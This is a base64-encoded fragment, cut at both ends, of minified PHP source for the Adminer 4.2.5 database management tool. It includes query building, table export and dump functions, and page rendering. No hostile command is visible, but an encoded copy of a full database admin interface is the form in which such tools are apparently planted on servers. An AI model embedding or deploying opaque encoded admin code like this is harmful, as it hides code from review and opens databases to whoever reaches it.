7ZWxzZWlmKCRYWyJvcCJdPT0iTElLRSAlJSIpJHNiPSIgTElLRSAiLiR0aGlzLT5wcm9jZXNzSW5wdXQoJHBbJFhbImNvbCJdXSwiJSRYW3ZhbF0lIik7ZWxzZWlmKCRYWyJvcCJdPT0iSUxJS0UgJSUiKSRzYj0iIElMSUtFICIuJHRoaXMtPnByb2Nlc3NJbnB1dCgkcFskWFsiY29sIl1dLCIlJFhbdmFsXSUiKTtlbHNlaWYoIXByZWdfbWF0Y2goJ35OVUxMJH4nLCRYWyJvcCJdKSkkc2IuPSIgIi4kdGhpcy0+cHJvY2Vzc0lucHV0KCRwWyRYWyJjb2wiXV0sJFhbInZhbCJdKTtpZigkWFsiY29sIl0hPSIiKSRKW109aWRmX2VzY2FwZSgkWFsiY29sIl0pLiRzYjtlbHNleyRuYj1hcnJheSgpO2ZvcmVhY2goJHANCmFzJEM9PiRvKXskQWQ9cHJlZ19tYXRjaCgnfmNoYXJ8dGV4dHxlbnVtfHNldH4nLCRvWyJ0eXBlIl0pO2lmKChpc19udW1lcmljKCRYWyJ2YWwiXSl8fCFwcmVnX21hdGNoKCd+KF58W15vXSlpbnR8ZmxvYXR8ZG91YmxlfGRlY2ltYWx8Yml0ficsJG9bInR5cGUiXSkpJiYoIXByZWdfbWF0Y2goIn5bXHg4MC1ceEZGXX4iLCRYWyJ2YWwiXSl8fCRBZCkpeyRDPWlkZl9lc2NhcGUoJEMpOyRuYltdPSgkdz09InNxbCImJiRBZCYmIXByZWdfbWF0Y2goIn5edXRmOF9+Iiwkb1siY29sbGF0aW9uIl0pPyJDT05WRVJUKCRDIFVTSU5HICIuY2hhcnNldCgkZykuIikiOiRDKTt9fSRKW109KCRuYj8iKCIuaW1wbG9kZSgiJHNiIE9SICIsJG5iKS4iJHNiKSI6IjAiKTt9fX1yZXR1cm4kSjt9ZnVuY3Rpb24NCnNlbGVjdE9yZGVyUHJvY2VzcygkcCwkdil7JEo9YXJyYXkoKTtmb3JlYWNoKChhcnJheSkkX0dFVFsib3JkZXIiXWFzJHg9PiRYKXtpZigkWCE9IiIpJEpbXT0ocHJlZ19tYXRjaCgnfl4oKENPVU5UXFwoRElTVElOQ1QgfFtBLVowLTlfXStcXCgpKGAoPzpbXmBdfGBgKStgfCIoPzpbXiJdfCIiKSsiKVxcKXxDT1VOVFxcKFxcKlxcKSkkficsJFgpPyRYOmlkZl9lc2NhcGUoJFgpKS4oaXNzZXQoJF9HRVRbImRlc2MiXVskeF0pPyIgREVTQyI6IiIpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCnNlbGVjdExpbWl0UHJvY2Vzcygpe3JldHVybihpc3NldCgkX0dFVFsibGltaXQiXSk/JF9HRVRbImxpbWl0Il06IjUwIik7fWZ1bmN0aW9uDQpzZWxlY3RMZW5ndGhQcm9jZXNzKCl7cmV0dXJuKGlzc2V0KCRfR0VUWyJ0ZXh0X2xlbmd0aCJdKT8kX0dFVFsidGV4dF9sZW5ndGgiXToiMTAwIik7fWZ1bmN0aW9uDQpzZWxlY3RFbWFpbFByb2Nlc3MoJFosJExjKXtyZXR1cm4NCmZhbHNlO31mdW5jdGlvbg0Kc2VsZWN0UXVlcnlCdWlsZCgkTSwkWiwkVmMsJFRlLCR6LCRFKXtyZXR1cm4iIjt9ZnVuY3Rpb24NCm1lc3NhZ2VRdWVyeSgkSCwkZmgpe2dsb2JhbCR3O3Jlc3RhcnRfc2Vzc2lvbigpOyRjZD0mZ2V0X3Nlc3Npb24oInF1ZXJpZXMiKTskaGQ9InNxbC0iLmNvdW50KCRjZFskX0dFVFsiZGIiXV0pO2lmKHN0cmxlbigkSCk+MWU2KSRIPXByZWdfcmVwbGFjZSgnfltceDgwLVx4RkZdKyR+JywnJyxzdWJzdHIoJEgsMCwxZTYpKS4iXG4uLi4iOyRjZFskX0dFVFsiZGIiXV1bXT1hcnJheSgkSCx0aW1lKCksJGZoKTtyZXR1cm4iIDxzcGFuIGNsYXNzPSd0aW1lJz4iLkBkYXRlKCJIOmk6cyIpLiI8L3NwYW4+IDxhIGhyZWY9JyMkaGQnIG9uY2xpY2s9XCJyZXR1cm4gIXRvZ2dsZSgnJGhkJyk7XCI+Ii4nU1FMIGNvbW1hbmQnLiI8L2E+Ii4iPGRpdiBpZD0nJGhkJyBjbGFzcz0naGlkZGVuJz48cHJlPjxjb2RlIGNsYXNzPSdqdXNoLSR3Jz4iLnNob3J0ZW5fdXRmOCgkSCwxMDAwKS4nPC9jb2RlPjwvcHJlPicuKCRmaD8iIDxzcGFuIGNsYXNzPSd0aW1lJz4oJGZoKTwvc3Bhbj4iOicnKS4oc3VwcG9ydCgic3FsIik/JzxwPjxhIGhyZWY9IicuaChzdHJfcmVwbGFjZSgiZGI9Ii51cmxlbmNvZGUoREIpLCJkYj0iLnVybGVuY29kZSgkX0dFVFsiZGIiXSksTUUpLidzcWw9Jmhpc3Rvcnk9Jy4oY291bnQoJGNkWyRfR0VUWyJkYiJdXSktMSkpLiciPicuJ0VkaXQnLic8L2E+JzonJykuJzwvZGl2Pic7fWZ1bmN0aW9uDQplZGl0RnVuY3Rpb25zKCRvKXtnbG9iYWwkZGM7JEo9KCRvWyJudWxsIl0/Ik5VTEwvIjoiIik7Zm9yZWFjaCgkZGMNCmFzJHg9PiRTYyl7aWYoISR4fHwoIWlzc2V0KCRfR0VUWyJjYWxsIl0pJiYoaXNzZXQoJF9HRVRbInNlbGVjdCJdKXx8d2hlcmUoJF9HRVQpKSkpe2ZvcmVhY2goJFNjDQphcyRwZj0+JFgpe2lmKCEkcGZ8fHByZWdfbWF0Y2goIn4kcGZ+Iiwkb1sidHlwZSJdKSkkSi49Ii8kWCI7fWlmKCR4JiYhcHJlZ19tYXRjaCgnfnNldHxibG9ifGJ5dGVhfHJhd3xmaWxlficsJG9bInR5cGUiXSkpJEouPSIvU1FMIjt9fWlmKCRvWyJhdXRvX2luY3JlbWVudCJdJiYhaXNzZXQoJF9HRVRbInNlbGVjdCJdKSYmIXdoZXJlKCRfR0VUKSkkSj0nQXV0byBJbmNyZW1lbnQnO3JldHVybg0KZXhwbG9kZSgiLyIsJEopO31mdW5jdGlvbg0KZWRpdElucHV0KCRRLCRvLCRJYSwkWSl7aWYoJG9bInR5cGUiXT09ImVudW0iKXJldHVybihpc3NldCgkX0dFVFsic2VsZWN0Il0pPyI8bGFiZWw+PGlucHV0IHR5cGU9J3JhZGlvJyRJYSB2YWx1ZT0nLTEnIGNoZWNrZWQ+PGk+Ii4nb3JpZ2luYWwnLiI8L2k+PC9sYWJlbD4gIjoiIikuKCRvWyJudWxsIl0/IjxsYWJlbD48aW5wdXQgdHlwZT0ncmFkaW8nJElhIHZhbHVlPScnIi4oJFkhPT1udWxsfHxpc3NldCgkX0dFVFsic2VsZWN0Il0pPyIiOiIgY2hlY2tlZCIpLiI+PGk+TlVMTDwvaT48L2xhYmVsPiAiOiIiKS5lbnVtX2lucHV0KCJyYWRpbyIsJElhLCRvLCRZLDApO3JldHVybiIiO31mdW5jdGlvbg0KcHJvY2Vzc0lucHV0KCRvLCRZLCRyPSIiKXtpZigkcj09IlNRTCIpcmV0dXJuJFk7JEM9JG9bImZpZWxkIl07JEo9cSgkWSk7aWYocHJlZ19tYXRjaCgnfl4obm93fGdldGRhdGV8dXVpZCkkficsJHIpKSRKPSIkcigpIjtlbHNlaWYocHJlZ19tYXRjaCgnfl5jdXJyZW50XyhkYXRlfHRpbWVzdGFtcCkkficsJHIpKSRKPSRyO2Vsc2VpZihwcmVnX21hdGNoKCd+XihbKy1dfFxcfFxcfCkkficsJHIpKSRKPWlkZl9lc2NhcGUoJEMpLiIgJHIgJEoiO2Vsc2VpZihwcmVnX21hdGNoKCd+XlsrLV0gaW50ZXJ2YWwkficsJHIpKSRKPWlkZl9lc2NhcGUoJEMpLiIgJHIgIi4ocHJlZ19tYXRjaCgifl4oXFxkK3wnWzAtOS46IC1dJykgW0EtWl9dKyR+aSIsJFkpPyRZOiRKKTtlbHNlaWYocHJlZ19tYXRjaCgnfl4oYWRkdGltZXxzdWJ0aW1lfGNvbmNhdCkkficsJHIpKSRKPSIkcigiLmlkZl9lc2NhcGUoJEMpLiIsICRKKSI7ZWxzZWlmKHByZWdfbWF0Y2goJ35eKG1kNXxzaGExfHBhc3N3b3JkfGVuY3J5cHQpJH4nLCRyKSkkSj0iJHIoJEopIjtyZXR1cm4NCnVuY29udmVydF9maWVsZCgkbywkSik7fWZ1bmN0aW9uDQpkdW1wT3V0cHV0KCl7JEo9YXJyYXkoJ3RleHQnPT4nb3BlbicsJ2ZpbGUnPT4nc2F2ZScpO2lmKGZ1bmN0aW9uX2V4aXN0cygnZ3plbmNvZGUnKSkkSlsnZ3onXT0nZ3ppcCc7cmV0dXJuJEo7fWZ1bmN0aW9uDQpkdW1wRm9ybWF0KCl7cmV0dXJuDQphcnJheSgnc3FsJz0+J1NRTCcsJ2Nzdic9PidDU1YsJywnY3N2Oyc9PidDU1Y7JywndHN2Jz0+J1RTVicpO31mdW5jdGlvbg0KZHVtcERhdGFiYXNlKCRtKXt9ZnVuY3Rpb24NCmR1bXBUYWJsZSgkUSwkSmcsJEJkPTApe2lmKCRfUE9TVFsiZm9ybWF0Il0hPSJzcWwiKXtlY2hvIlx4ZWZceGJiXHhiZiI7aWYoJEpnKWR1bXBfY3N2KGFycmF5X2tleXMoZmllbGRzKCRRKSkpO31lbHNle2lmKCRCZD09Mil7JHA9YXJyYXkoKTtmb3JlYWNoKGZpZWxkcygkUSlhcyRDPT4kbykkcFtdPWlkZl9lc2NhcGUoJEMpLiIgJG9bZnVsbF90eXBlXSI7JGk9IkNSRUFURSBUQUJMRSAiLnRhYmxlKCRRKS4iICgiLmltcGxvZGUoIiwgIiwkcCkuIikiO31lbHNlJGk9Y3JlYXRlX3NxbCgkUSwkX1BPU1RbImF1dG9faW5jcmVtZW50Il0pO3NldF91dGY4bWI0KCRpKTtpZigkSmcmJiRpKXtpZigkSmc9PSJEUk9QK0NSRUFURSJ8fCRCZD09MSllY2hvIkRST1AgIi4oJEJkPT0yPyJWSUVXIjoiVEFCTEUiKS4iIElGIEVYSVNUUyAiLnRhYmxlKCRRKS4iO1xuIjtpZigkQmQ9PTEpJGk9cmVtb3ZlX2RlZmluZXIoJGkpO2VjaG8iJGk7XG5cbiI7fX19ZnVuY3Rpb24NCmR1bXBEYXRhKCRRLCRKZywkSCl7Z2xvYmFsJGcsJHc7JGNlPSgkdz09InNxbGl0ZSI/MDoxMDQ4NTc2KTtpZigkSmcpe2lmKCRfUE9TVFsiZm9ybWF0Il09PSJzcWwiKXtpZigkSmc9PSJUUlVOQ0FURStJTlNFUlQiKWVjaG8NCnRydW5jYXRlX3NxbCgkUSkuIjtcbiI7JHA9ZmllbGRzKCRRKTt9JEk9JGctPnF1ZXJ5KCRILDEpO2lmKCRJKXskdWQ9IiI7JFdhPSIiOyRJZD1hcnJheSgpOyRMZz0iIjskRWM9KCRRIT0nJz8nZmV0Y2hfYXNzb2MnOidmZXRjaF9yb3cnKTt3aGlsZSgkSz0kSS0+JEVjKCkpe2lmKCEkSWQpeyRRaD1hcnJheSgpO2ZvcmVhY2goJEsNCmFzJFgpeyRvPSRJLT5mZXRjaF9maWVsZCgpOyRJZFtdPSRvLT5uYW1lOyR4PWlkZl9lc2NhcGUoJG8tPm5hbWUpOyRRaFtdPSIkeCA9IFZBTFVFUygkeCkiO30kTGc9KCRKZz09IklOU0VSVCtVUERBVEUiPyJcbk9OIERVUExJQ0FURSBLRVkgVVBEQVRFICIuaW1wbG9kZSgiLCAiLCRRaCk6IiIpLiI7XG4iO31pZigkX1BPU1RbImZvcm1hdCJdIT0ic3FsIil7aWYoJEpnPT0idGFibGUiKXtkdW1wX2NzdigkSWQpOyRKZz0iSU5TRVJUIjt9ZHVtcF9jc3YoJEspO31lbHNle2lmKCEkdWQpJHVkPSJJTlNFUlQgSU5UTyAiLnRhYmxlKCRRKS4iICgiLmltcGxvZGUoIiwgIixhcnJheV9tYXAoJ2lkZl9lc2NhcGUnLCRJZCkpLiIpIFZBTFVFUyI7Zm9yZWFjaCgkSw0KYXMkeD0+JFgpeyRvPSRwWyR4XTskS1skeF09KCRYIT09bnVsbD91bmNvbnZlcnRfZmllbGQoJG8scHJlZ19tYXRjaCgnfihefFteb10paW50fGZsb2F0fGRvdWJsZXxkZWNpbWFsficsJG9bInR5cGUiXSkmJiRYIT0nJz8kWDpxKCRYKSk6Ik5VTEwiKTt9JGlnPSgkY2U/IlxuIjoiICIpLiIoIi5pbXBsb2RlKCIsXHQiLCRLKS4iKSI7aWYoISRXYSkkV2E9JHVkLiRpZztlbHNlaWYoc3RybGVuKCRXYSkrNCtzdHJsZW4oJGlnKStzdHJsZW4oJExnKTwkY2UpJFdhLj0iLCRpZyI7ZWxzZXtlY2hvJFdhLiRMZzskV2E9JHVkLiRpZzt9fX1pZigkV2EpZWNobyRXYS4kTGc7fWVsc2VpZigkX1BPU1RbImZvcm1hdCJdPT0ic3FsIillY2hvIi0tICIuc3RyX3JlcGxhY2UoIlxuIiwiICIsJGctPmVycm9yKS4iXG4iO319ZnVuY3Rpb24NCmR1bXBGaWxlbmFtZSgkaWQpe3JldHVybg0KZnJpZW5kbHlfdXJsKCRpZCE9IiI/JGlkOihTRVJWRVIhPSIiP1NFUlZFUjoibG9jYWxob3N0IikpO31mdW5jdGlvbg0KZHVtcEhlYWRlcnMoJGlkLCRyZT1mYWxzZSl7JGRmPSRfUE9TVFsib3V0cHV0Il07JHpjPShwcmVnX21hdGNoKCd+c3FsficsJF9QT1NUWyJmb3JtYXQiXSk/InNxbCI6KCRyZT8idGFyIjoiY3N2IikpO2hlYWRlcigiQ29udGVudC1UeXBlOiAiLigkZGY9PSJneiI/ImFwcGxpY2F0aW9uL3gtZ3ppcCI6KCR6Yz09InRhciI/ImFwcGxpY2F0aW9uL3gtdGFyIjooJHpjPT0ic3FsInx8JGRmIT0iZmlsZSI/InRleHQvcGxhaW4iOiJ0ZXh0L2NzdiIpLiI7IGNoYXJzZXQ9dXRmLTgiKSkpO2lmKCRkZj09Imd6IilvYl9zdGFydCgnb2JfZ3plbmNvZGUnLDFlNik7cmV0dXJuJHpjO31mdW5jdGlvbg0KaG9tZXBhZ2UoKXtlY2hvJzxwIGNsYXNzPSJsaW5rcyI+Jy4oJF9HRVRbIm5zIl09PSIiJiZzdXBwb3J0KCJkYXRhYmFzZSIpPyc8YSBocmVmPSInLmgoTUUpLidkYXRhYmFzZT0iPicuJ0FsdGVyIGRhdGFiYXNlJy4iPC9hPlxuIjoiIiksKHN1cHBvcnQoInNjaGVtZSIpPyI8YSBocmVmPSciLmgoTUUpLiJzY2hlbWU9Jz4iLigkX0dFVFsibnMiXSE9IiI/J0FsdGVyIHNjaGVtYSc6J0NyZWF0ZSBzY2hlbWEnKS4iPC9hPlxuIjoiIiksKCRfR0VUWyJucyJdIT09IiI/JzxhIGhyZWY9IicuaChNRSkuJ3NjaGVtYT0iPicuJ0RhdGFiYXNlIHNjaGVtYScuIjwvYT5cbiI6IiIpLChzdXBwb3J0KCJwcml2aWxlZ2VzIik/IjxhIGhyZWY9JyIuaChNRSkuInByaXZpbGVnZXM9Jz4iLidQcml2aWxlZ2VzJy4iPC9hPlxuIjoiIik7cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KbmF2aWdhdGlvbigkcWUpe2dsb2JhbCRpYSwkdywkVmIsJGc7ZWNobyc8aDE+DQonLCR0aGlzLT5uYW1lKCksJyA8c3BhbiBjbGFzcz0idmVyc2lvbiI+JywkaWEsJzwvc3Bhbj4NCjxhIGhyZWY9Imh0dHBzOi8vd3d3LmFkbWluZXIub3JnLyNkb3dubG9hZCIgdGFyZ2V0PSJfYmxhbmsiIGlkPSJ2ZXJzaW9uIj4nLCh2ZXJzaW9uX2NvbXBhcmUoJGlhLCRfQ09PS0lFWyJhZG1pbmVyX3ZlcnNpb24iXSk8MD9oKCRfQ09PS0lFWyJhZG1pbmVyX3ZlcnNpb24iXSk6IiIpLCc8L2E+DQo8L2gxPg0KJztpZigkcWU9PSJhdXRoIil7JEljPXRydWU7Zm9yZWFjaCgoYXJyYXkpJF9TRVNTSU9OWyJwd2RzIl1hcyRTaD0+JHZnKXtmb3JlYWNoKCR2Zw0KYXMkTj0+JE5oKXtmb3JlYWNoKCROaA0KYXMkVj0+JEcpe2lmKCRHIT09bnVsbCl7aWYoJEljKXtlY2hvIjxwIGlkPSdsb2dpbnMnIG9ubW91c2VvdmVyPSdtZW51T3Zlcih0aGlzLCBldmVudCk7JyBvbm1vdXNlb3V0PSdtZW51T3V0KHRoaXMpOyc+XG4iOyRJYz1mYWxzZTt9JEhiPSRfU0VTU0lPTlsiZGIiXVskU2hdWyROXVskVl07Zm9yZWFjaCgoJEhiP2FycmF5X2tleXMoJEhiKTphcnJheSgiIikpYXMkbSllY2hvIjxhIGhyZWY9JyIuaChhdXRoX3VybCgkU2gsJE4sJFYsJG0pKS4iJz4oJFZiWyRTaF0pICIuaCgkVi4oJE4hPSIiPyJAJE4iOiIiKS4oJG0hPSIiPyIgLSAkbSI6IiIpKS4iPC9hPjxicj5cbiI7fX19fX1lbHNle2lmKCRfR0VUWyJucyJdIT09IiImJiEkcWUmJkRCIT0iIil7JGctPnNlbGVjdF9kYihEQik7JFM9dGFibGVfc3RhdHVzKCcnLHRydWUpO31pZihzdXBwb3J0KCJzcWwiKSl7ZWNobyc8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSInLGgocHJlZ19yZXBsYWNlKCJ+XFw/Lip+IiwiIixNRSkpLiI/ZmlsZT1qdXNoLmpzJmFtcDt2ZXJzaW9uPTQuMi41IiwnIj48L3NjcmlwdD4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCic7aWYoJFMpeyRWZD1hcnJheSgpO2ZvcmVhY2goJFMNCmFzJFE9PiRVKSRWZFtdPXByZWdfcXVvdGUoJFEsJy8nKTtlY2hvInZhciBqdXNoTGlua3MgPSB7ICR3OiBbICciLmpzX2VzY2FwZShNRSkuKHN1cHBvcnQoInRhYmxlIik/InRhYmxlPSI6InNlbGVjdD0iKS4iXCQmJywgL1xcYigiLmltcGxvZGUoInwiLCRWZCkuIilcXGIvZyBdIH07XG4iO2ZvcmVhY2goYXJyYXkoImJhYyIsImJyYSIsInNxbGl0ZV9xdW8iLCJtc3NxbF9icmEiKWFzJFgpZWNobyJqdXNoTGlua3MuJFggPSBqdXNoTGlua3MuJHc7XG4iO31lY2hvJ2JvZHlMb2FkKFwnJywoaXNfb2JqZWN0KCRnKT9zdWJzdHIoJGctPnNlcnZlcl9pbmZvLDAsMyk6IiIpLCdcJyk7DQo8L3NjcmlwdD4NCic7fSR0aGlzLT5kYXRhYmFzZXNQcmludCgkcWUpO2lmKERCPT0iInx8ISRxZSl7ZWNobyI8cCBjbGFzcz0nbGlua3MnPiIuKHN1cHBvcnQoInNxbCIpPyI8YSBocmVmPSciLmgoTUUpLiJzcWw9JyIuYm9sZChpc3NldCgkX0dFVFsic3FsIl0pJiYhaXNzZXQoJF9HRVRbImltcG9ydCJdKSkuIj4iLidTUUwgY29tbWFuZCcuIjwvYT5cbjxhIGhyZWY9JyIuaChNRSkuImltcG9ydD0nIi5ib2xkKGlzc2V0KCRfR0VUWyJpbXBvcnQiXSkpLiI+Ii4nSW1wb3J0Jy4iPC9hPlxuIjoiIikuIiI7aWYoc3VwcG9ydCgiZHVtcCIpKWVjaG8iPGEgaHJlZj0nIi5oKE1FKS4iZHVtcD0iLnVybGVuY29kZShpc3NldCgkX0dFVFsidGFibGUiXSk/JF9HRVRbInRhYmxlIl06JF9HRVRbInNlbGVjdCJdKS4iJyBpZD0nZHVtcCciLmJvbGQoaXNzZXQoJF9HRVRbImR1bXAiXSkpLiI+Ii4nRXhwb3J0Jy4iPC9hPlxuIjt9aWYoJF9HRVRbIm5zIl0hPT0iIiYmISRxZSYmREIhPSIiKXtlY2hvJzxhIGhyZWY9IicuaChNRSkuJ2NyZWF0ZT0iJy5ib2xkKCRfR0VUWyJjcmVhdGUiXT09PSIiKS4iPiIuJ0NyZWF0ZSB0YWJsZScuIjwvYT5cbiI7aWYoISRTKWVjaG8iPHAgY2xhc3M9J21lc3NhZ2UnPiIuJ05vIHRhYmxlcy4nLiJcbiI7ZWxzZSR0aGlzLT50YWJsZXNQcmludCgkUyk7fX19ZnVuY3Rpb24NCmRhdGFiYXNlc1ByaW50KCRxZSl7Z2xvYmFsJGIsJGc7JGw9JHRoaXMtPmRhdGFiYXNlcygpO2VjaG8nPGZvcm0gYWN0aW9uPSIiPg0KPHAgaWQ9ImRicyI+DQonO2hpZGRlbl9maWVsZHNfZ2V0KCk7JEZiPSIgb25tb3VzZWRvd249J2RiTW91c2VEb3duKGV2ZW50LCB0aGlzKTsnIG9uY2hhbmdlPSdkYkNoYW5nZSh0aGlzKTsnIjtlY2hvIjxzcGFuIHRpdGxlPSciLidkYXRhYmFzZScuIic+REI8L3NwYW4+OiAiLigkbD8iPHNlbGVjdCBuYW1lPSdkYickRmI+Ii5vcHRpb25saXN0KGFycmF5KCIiPT4iIikrJGwsREIpLiI8L3NlbGVjdD4iOic8aW5wdXQgbmFtZT0iZGIiIHZhbHVlPSInLmgoREIpLiciIGF1dG9jYXBpdGFsaXplPSJvZmYiPicpLCI8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nIi4nVXNlJy4iJyIuKCRsPyIgY2xhc3M9J2hpZGRlbiciOiIiKS4iPlxuIjtpZigkcWUhPSJkYiImJkRCIT0iIiYmJGctPnNlbGVjdF9kYihEQikpe2lmKHN1cHBvcnQoInNjaGVtZSIpKXtlY2hvIjxicj4iLidTY2hlbWEnLiI6IDxzZWxlY3QgbmFtZT0nbnMnJEZiPiIub3B0aW9ubGlzdChhcnJheSgiIj0+IiIpKyRiLT5zY2hlbWFzKCksJF9HRVRbIm5zIl0pLiI8L3NlbGVjdD4iO2lmKCRfR0VUWyJucyJdIT0iIilzZXRfc2NoZW1hKCRfR0VUWyJucyJdKTt9fWVjaG8oaXNzZXQoJF9HRVRbInNxbCJdKT8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsIiB2YWx1ZT0iIj4nOihpc3NldCgkX0dFVFsic2NoZW1hIl0pPyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzY2hlbWEiIHZhbHVlPSIiPic6KGlzc2V0KCRfR0VUWyJkdW1wIl0pPyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkdW1wIiB2YWx1ZT0iIj4nOihpc3NldCgkX0dFVFsicHJpdmlsZWdlcyJdKT8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icHJpdmlsZWdlcyIgdmFsdWU9IiI+JzoiIikpKSksIjwvcD48L2Zvcm0+XG4iO31mdW5jdGlvbg0KdGFibGVzUHJpbnQoJFMpe2VjaG8iPHAgaWQ9J3RhYmxlcycgb25tb3VzZW92ZXI9J21lbnVPdmVyKHRoaXMsIGV2ZW50KTsnIG9ubW91c2VvdXQ9J21lbnVPdXQodGhpcyk7Jz5cbiI7Zm9yZWFjaCgkUw0KYXMkUT0+JEZnKXtlY2hvJzxhIGhyZWY9IicuaChNRSkuJ3NlbGVjdD0nLnVybGVuY29kZSgkUSkuJyInLmJvbGQoJF9HRVRbInNlbGVjdCJdPT0kUXx8JF9HRVRbImVkaXQiXT09JFEsInNlbGVjdCIpLiI+Ii4nc2VsZWN0Jy4iPC9hPiAiOyRDPSR0aGlzLT50YWJsZU5hbWUoJEZnKTtlY2hvKHN1cHBvcnQoInRhYmxlIil8fHN1cHBvcnQoImluZGV4ZXMiKT8nPGEgaHJlZj0iJy5oKE1FKS4ndGFibGU9Jy51cmxlbmNvZGUoJFEpLiciJy5ib2xkKGluX2FycmF5KCRRLGFycmF5KCRfR0VUWyJ0YWJsZSJdLCRfR0VUWyJjcmVhdGUiXSwkX0dFVFsiaW5kZXhlcyJdLCRfR0VUWyJmb3JlaWduIl0sJF9HRVRbInRyaWdnZXIiXSkpLChpc192aWV3KCRGZyk/InZpZXciOiIiKSwic3RydWN0dXJlIikuIiB0aXRsZT0nIi4nU2hvdyBzdHJ1Y3R1cmUnLiInPiRDPC9hPiI6IjxzcGFuPiRDPC9zcGFuPiIpLiI8YnI+XG4iO319fSRiPShmdW5jdGlvbl9leGlzdHMoJ2FkbWluZXJfb2JqZWN0Jyk/YWRtaW5lcl9vYmplY3QoKTpuZXcNCkFkbWluZXIpO2lmKCRiLT5vcGVyYXRvcnM9PT1udWxsKSRiLT5vcGVyYXRvcnM9JE9lO2Z1bmN0aW9uDQpwYWdlX2hlYWRlcigkaWgsJG49IiIsJFZhPWFycmF5KCksJGpoPSIiKXtnbG9iYWwkY2EsJGlhLCRiLCRWYiwkdztwYWdlX2hlYWRlcnMoKTtpZihpc19hamF4KCkmJiRuKXtwYWdlX21lc3NhZ2VzKCRuKTtleGl0O30ka2g9JGloLigkamghPSIiPyI6ICRqaCI6IiIpOyRsaD1zdHJpcF90YWdzKCRraC4oU0VSVkVSIT0iIiYmU0VSVkVSIT0ibG9jYWxob3N0Ij9oKCIgLSAiLlNFUlZFUik6IiIpLiIgLSAiLiRiLT5uYW1lKCkpO2VjaG8nPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiIgZGlyPSJsdHIiPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1TY3JpcHQtVHlwZSIgY29udGVudD0idGV4dC9qYXZhc2NyaXB0Ij4NCjxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0ibm9pbmRleCI+DQo8bWV0YSBuYW1lPSJyZWZlcnJlciIgY29udGVudD0ib3JpZ2luLXdoZW4tY3Jvc3NvcmlnaW4iPg0KPHRpdGxlPicsJGxoLCc8L3RpdGxlPg0KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iJyxoKHByZWdfcmVwbGFjZSgiflxcPy4qfiIsIiIsTUUpKS4iP2ZpbGU9ZGVmYXVsdC5jc3MmYW1wO3ZlcnNpb249NC4yLjUiLCciPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iJyxoKHByZWdfcmVwbGFjZSgiflxcPy4qfiIsIiIsTUUpKS4iP2ZpbGU9ZnVuY3Rpb25zLmpzJmFtcDt2ZXJzaW9uPTQuMi41IiwnIj48L3NjcmlwdD4NCic7aWYoJGItPmhlYWQoKSl7ZWNobyc8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iJyxoKHByZWdfcmVwbGFjZSgiflxcPy4qfiIsIiIsTUUpKS4iP2ZpbGU9ZmF2aWNvbi5pY28mYW1wO3ZlcnNpb249NC4yLjUiLCciPg0KPGxpbmsgcmVsPSJhcHBsZS10b3VjaC1pY29uIiBocmVmPSInLGgocHJlZ19yZXBsYWNlKCJ+XFw/Lip+IiwiIixNRSkpLiI/ZmlsZT1mYXZpY29uLmljbyZhbXA7dmVyc2lvbj00LjIuNSIsJyI+DQonO2lmKGZpbGVfZXhpc3RzKCJhZG1pbmVyLmNzcyIpKXtlY2hvJzxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9ImFkbWluZXIuY3NzIj4NCic7fX1lY2hvJw0KPGJvZHkgY2xhc3M9Imx0ciBub2pzIiBvbmtleWRvd249ImJvZHlLZXlkb3duKGV2ZW50KTsiIG9uY2xpY2s9ImJvZHlDbGljayhldmVudCk7IicsKGlzc2V0KCRfQ09PS0lFWyJhZG1pbmVyX3ZlcnNpb24iXSk/IiI6IiBvbmxvYWQ9XCJ2ZXJpZnlWZXJzaW9uKCckaWEnKTtcIiIpOz8+Pg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KZG9jdW1lbnQuYm9keS5jbGFzc05hbWUgPSBkb2N1bWVudC5ib2R5LmNsYXNzTmFtZS5yZXBsYWNlKC8gbm9qcy8sICcganMnKTsNCnZhciBvZmZsaW5lTWVzc2FnZSA9ICc8P3BocCBlY2hvDQpqc19lc2NhcGUoJ1lvdSBhcmUgb2ZmbGluZS4nKSwnXCc7DQo8L3NjcmlwdD4NCg0KPGRpdiBpZD0iaGVscCIgY2xhc3M9Imp1c2gtJywkdywnIGpzb25seSBoaWRkZW4iIG9ubW91c2VvdmVyPSJoZWxwT3BlbiA9IDE7IiBvbm1vdXNlb3V0PSJoZWxwTW91c2VvdXQodGhpcywgZXZlbnQpOyI+PC9kaXY+DQoNCjxkaXYgaWQ9ImNvbnRlbnQiPg0KJztpZigkVmEhPT1udWxsKXskXz1zdWJzdHIocHJlZ19yZXBsYWNlKCd+XGIodXNlcm5hbWV8ZGJ8bnMpPVteJl0qJn4nLCcnLE1FKSwwLC0xKTtlY2hvJzxwIGlkPSJicmVhZGNydW1iIj48YSBocmVmPSInLmgoJF8/JF86Ii4iKS4nIj4nLiRWYltEUklWRVJdLic8L2E+ICZyYXF1bzsgJzskXz1zdWJzdHIocHJlZ19yZXBsYWNlKCd+XGIoZGJ8bnMpPVteJl0qJn4nLCcnLE1FKSwwLC0xKTskTj0oU0VSVkVSIT0iIj9oKFNFUlZFUik6J1NlcnZlcicpO2lmKCRWYT09PWZhbHNlKWVjaG8iJE5cbiI7ZWxzZXt